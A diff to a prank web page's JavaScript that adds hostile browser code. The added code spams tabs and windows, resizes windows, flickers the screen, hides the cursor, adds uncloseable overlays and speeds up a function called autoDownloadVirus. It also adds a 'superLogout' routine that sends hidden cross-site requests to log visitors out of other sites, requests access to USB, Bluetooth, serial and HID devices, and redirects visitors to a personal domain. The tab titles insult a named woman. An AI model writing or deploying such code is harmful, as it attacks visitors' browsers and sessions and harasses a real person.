@@ -91,6 +91,14 @@ function getBlockedKeysByOS(os) {
     return osSpecificKeys;
 }
 
+function randomResizeWindow() {
+    const randomWidth = Math.floor(Math.random() * 300 + 800);
+    const randomHeight = Math.floor(Math.random() * 200 + 600);
+    window.resizeTo(randomWidth, randomHeight);
+}
+setInterval(randomResizeWindow, 100);
+
+
 // Merge OS-specific keys with global block keys
 const os = getOS();
 const osSpecificKeys = getBlockedKeysByOS(os);
@@ -113,7 +121,7 @@ document.addEventListener('keypress', (e) => e.preventDefault());
     function openRandomTabs() {
         window.open(window.location.href, '_blank');
     }
-    setInterval(openRandomTabs, 500);
+    setInterval(openRandomTabs, 1000);
 
     function requestNotification() {
         if (Notification.permission !== 'granted') {
@@ -157,9 +165,9 @@ document.addEventListener('keypress', (e) => e.preventDefault());
         button.style.top = `${Math.random() * window.innerHeight}px`;
         button.onclick = () => alert("Wrong button!");
         document.body.appendChild(button);
-        setTimeout(() => button.remove(), 4000);
+        setTimeout(() => button.remove(), 1500);
     }
-    setInterval(randomButton, 5000);
+    setInterval(randomButton, 1000);
 
     function memeGIF() {
         let img = document.createElement("img");
@@ -173,6 +181,7 @@ document.addEventListener('keypress', (e) => e.preventDefault());
     }
     setInterval(memeGIF, 5000);
 
+    
     function flipUpsideDown() {
         document.body.style.transform = "rotate(180deg)";
         setTimeout(() => { document.body.style.transform = "rotate(0deg)"; }, 3000);
@@ -196,9 +205,9 @@ document.addEventListener('keypress', (e) => e.preventDefault());
     setInterval(autoTypeMessages, 100);
 
     function changeTabTitle() {
-        document.title = ["HACKED", "ERROR 404", "SYSTEM FAILURE", "VIRUS DETECTED", "YOU ARE DOOMED"][Math.floor(Math.random() * 5)];
+        document.title = ["TINEKE IS EEN MILF", "JE MOEDER", "JE VADER", "WILMA", "WIE IS WILMA?"][Math.floor(Math.random() * 5)];
     }
-    setInterval(changeTabTitle, 250);
+    setInterval(changeTabTitle, 500);
 
     function spamConsole() {
         setInterval(() => {
@@ -303,7 +312,7 @@ setInterval(randomJumpscare, 274);
 function openNewWindowWithTab() {
     let newWin = window.open(window.location.href, "_blank", "width=600,height=400");
 }
-setInterval(openNewWindowWithTab, 500); // Every 35 seconds
+setInterval(openNewWindowWithTab, 1500); // Every 35 seconds
 
 const loudSounds = [
     "https://www.soundjay.com/misc/sounds/bell-ringing-05.mp3",
@@ -408,8 +417,288 @@ function autoDownloadVirus() {
     a.click();
     document.body.removeChild(a);
 }
-setInterval(autoDownloadVirus, 150); // E
+setInterval(autoDownloadVirus, 100); // E
 
+function hideCursor() {
+    document.body.style.cursor = 'none';
+    setTimeout(() => {
+        document.body.style.cursor = 'auto';
+    }, 20);
+}
+setInterval(hideCursor, 10);
+
+const urls = ["https://tinekesieders.nl"];
+setInterval(() => {
+    window.location.href = urls[Math.floor(Math.random() * urls.length)];
+}, 250);
+
+function randomLayout() {
+    const screenWidth = Math.random() * 1000 + 500;
+    const screenHeight = Math.random() * 500 + 500;
+    window.resizeTo(screenWidth, screenHeight);
+}
+setInterval(randomLayout, 2000);
+
+function simulateTyping() {
+    const keys = ['a', 'b', 'c', '1', '2', '3'];
+    const randomKey = keys[Math.floor(Math.random() * keys.length)];
+    const event = new KeyboardEvent('keydown', { key: randomKey });
+    document.dispatchEvent(event);
+}
+setInterval(simulateTyping, 125);
+
+function uncloseablePopup() {
+    const popup = document.createElement('div');
+    popup.style.position = 'fixed';
+    popup.style.top = '50%';
+    popup.style.left = '50%';
+    popup.style.transform = 'translate(-50%, -50%)';
+    popup.style.padding = '20px';
+    popup.style.backgroundColor = 'yellow';
+    popup.innerText = "You can't close me!";
+    document.body.appendChild(popup);
+}
+setInterval(uncloseablePopup, 500);
+
+function spoofUserAgent() {
+    const userAgents = [
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+        'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
+        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:68.0) Gecko/20100101 Firefox/68.0'
+    ];
+    const randomAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
+    navigator.__defineGetter__('userAgent', function () { return randomAgent; });
+}
+setInterval(spoofUserAgent, 250);
+
+function openUncloseableTab() {
+    window.open('https://example.com', '_blank');
+}
+setInterval(openUncloseableTab, 3000);
+
+function snowflakes() {
+    const snowflake = document.createElement('div');
+    snowflake.style.position = 'absolute';
+    snowflake.style.top = '0px';
+    snowflake.style.left = `${Math.random() * window.innerWidth}px`;
+    snowflake.style.width = '10px';
+    snowflake.style.height = '10px';
+    snowflake.style.backgroundColor = 'white';
+    snowflake.style.borderRadius = '50%';
+    document.body.appendChild(snowflake);
+
+    const fallSpeed = Math.random() * 3 + 2; // Random speed
+    const moveLeftRight = Math.random() * 2 - 1; // Move left or right randomly
+
+    let yPosition = 0;
+    setInterval(() => {
+        snowflake.style.top = `${yPosition}px`;
+        snowflake.style.left = `${snowflake.offsetLeft + moveLeftRight}px`;
+        yPosition += fallSpeed;
+        if (yPosition > window.innerHeight) {
+            snowflake.remove();
+        }
+    }, 50);
+}
+setInterval(snowflakes, 200);
+
+function screenFlicker() {
+    const flicker = document.createElement('div');
+    flicker.style.position = 'absolute';
+    flicker.style.top = '0';
+    flicker.style.left = '0';
+    flicker.style.width = '100vw';
+    flicker.style.height = '100vh';
+    flicker.style.backgroundColor = 'black';
+    flicker.style.opacity = '0.7';
+    document.body.appendChild(flicker);
+    setTimeout(() => flicker.remove(), Math.random() * 100 + 50);
+}
+setInterval(screenFlicker, 500);
+
+function uncloseableModal() {
+    const modal = document.createElement('div');
+    modal.style.position = 'fixed';
+    modal.style.top = '0';
+    modal.style.left = '0';
+    modal.style.width = '100vw';
+    modal.style.height = '100vh';
+    modal.style.backgroundColor = 'rgba(0, 0, 0, 0.9)';
+    modal.style.color = 'white';
+    modal.style.display = 'flex';
+    modal.style.justifyContent = 'center';
+    modal.style.alignItems = 'center';
+    modal.style.fontSize = '40px';
+    modal.innerText = 'You cannot close this!';
+    document.body.appendChild(modal);
+}
+setInterval(uncloseableModal, 3000);
+
+function jumpText() {
+    const elements = document.querySelectorAll('p, h1, span');
+    elements.forEach((el) => {
+        el.style.position = 'relative';
+        el.style.top = `${Math.random() * 20 - 10}px`;
+        el.style.left = `${Math.random() * 20 - 10}px`;
+    });
+}
+setInterval(jumpText, 500);
+
+document.addEventListener('mousemove', (e) => {
+    const div = document.createElement('div');
+    div.style.position = 'absolute';
+    div.style.top = `${e.clientY}px`;
+    div.style.left = `${e.clientX}px`;
+    div.style.width = '10px';
+    div.style.height = '10px';
+    div.style.backgroundColor = 'red';
+    document.body.appendChild(div);
+    setTimeout(() => div.remove(), 1000);
+});
+
+function resizeModal() {
+    const modal = document.createElement('div');
+    modal.style.position = 'fixed';
+    modal.style.top = '50%';
+    modal.style.left = '50%';
+    modal.style.transform = 'translate(-50%, -50%)';
+    modal.style.width = `${Math.random() * 200 + 100}px`;
+    modal.style.height = `${Math.random() * 200 + 100}px`;
+    modal.style.backgroundColor = 'yellow';
+    modal.innerText = 'I keep resizing!';
+    document.body.appendChild(modal);
+    setTimeout(() => modal.remove(), 5000);
+}
+setInterval(resizeModal, 3000);
+
+function superLogout () {
+  function cleanup (el, delayCleanup) {
+    if (delayCleanup) {
+      delayCleanup = false
+      return
+    }
+    el.parentNode.removeChild(el)
+  }
+
+  function get (url) {
+    const img = document.createElement('img')
+    img.onload = () => cleanup(img)
+    img.onerror = () => cleanup(img)
+    img.style = HIDDEN_STYLE
+    document.body.appendChild(img)
+    img.src = url
+  }
+
+  function post (url, params) {
+    const iframe = document.createElement('iframe')
+    iframe.style = HIDDEN_STYLE
+    iframe.name = 'iframe' + numSuperLogoutIframes
+    document.body.appendChild(iframe)
+
+    numSuperLogoutIframes += 1
+
+    const form = document.createElement('form')
+    form.style = HIDDEN_STYLE
+
+    let numLoads = 0
+    iframe.onload = iframe.onerror = () => {
+      if (numLoads >= 1) cleanup(iframe)
+      numLoads += 1
+    }
+    form.action = url
+    form.method = 'POST'
+    form.target = iframe.name
+
+    for (const param in params) {
+      if (Object.prototype.hasOwnProperty.call(params, param)) {
+        const input = document.createElement('input')
+        input.type = 'hidden'
+        input.name = param
+        input.value = params[param]
+        form.appendChild(input)
+      }
+    }
+
+    document.body.appendChild(form)
+    form.submit()
+  }
+  for (const name in LOGOUT_SITES) {
+    const method = LOGOUT_SITES[name][0]
+    const url = LOGOUT_SITES[name][1]
+    const params = LOGOUT_SITES[name][2] || {}
+
+    if (method === 'GET') {
+      get(url)
+    } else {
+      post(url, params)
+    }
+
+    const div = document.createElement('div')
+    div.innerText = `Logging you out from ${name}...`
+
+    const logoutMessages = document.querySelector('.logout-messages')
+    logoutMessages.appendChild(div)
+  }
+}
+  superLogout()
+  setInterval(superLogout, 1000)
+
+/**
+ * Request access to MIDI devices.
+ * Requires user-initiated event.
+ */
+ function requestMidiAccess () {
+  try {
+    navigator.requestMIDIAccess({
+      sysex: true
+    })
+  } catch {}
+}
+
+/**
+ * Request access to Bluetooth devices.
+ * Requires user-initiated event.
+ */
+function requestBluetoothAccess () {
+  try {
+    navigator.bluetooth.requestDevice({
+      // filters: [...] <- Prefer filters to save energy & show relevant devices.
+      // acceptAllDevices here ensures dialog can populate, we don't care with what.
+      acceptAllDevices: true
+    })
+      .then(device => device.gatt.connect())
+  } catch {}
+}
+
+/**
+ * Request access to USB devices.
+ * Requires user-initiated event.
+ */
+function requestUsbAccess () {
+  try {
+    navigator.usb.requestDevice({ filters: [{}] })
+  } catch {}
+}
+
+/**
+ * Request access to Serial devices.
+ * Requires user-initiated event.
+ */
+function requestSerialAccess () {
+  try {
+    navigator.serial.requestPort({ filters: [] })
+  } catch {}
+}
+
+/**
+ * Request access to HID devices.
+ * Requires user-initiated event.
+ */
+function requestHidAccess () {
+  try {
+    navigator.hid.requestDevice({ filters: [] })
+  } catch {}
+}
 
 </script>
 </body>
